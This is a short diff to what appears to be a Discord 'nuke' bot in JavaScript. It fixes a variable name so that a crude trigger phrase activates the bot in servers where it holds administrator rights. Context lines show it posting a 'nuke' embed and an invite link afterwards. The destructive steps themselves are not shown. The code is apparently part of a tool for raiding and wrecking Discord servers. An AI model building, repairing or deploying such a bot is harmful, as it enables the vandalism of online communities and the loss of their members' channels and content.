@@ -539,7 +539,7 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
  
  
  client.on('message', message => {
-  if(!unallowedguilds.includes(msg.guild.id)) {
+  if(!unallowedguilds.includes(message.guild.id)) {
    if(message.content === 'kiss my disrespectful ass') {
  if(message.channel.type === "dm") {return}
  if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
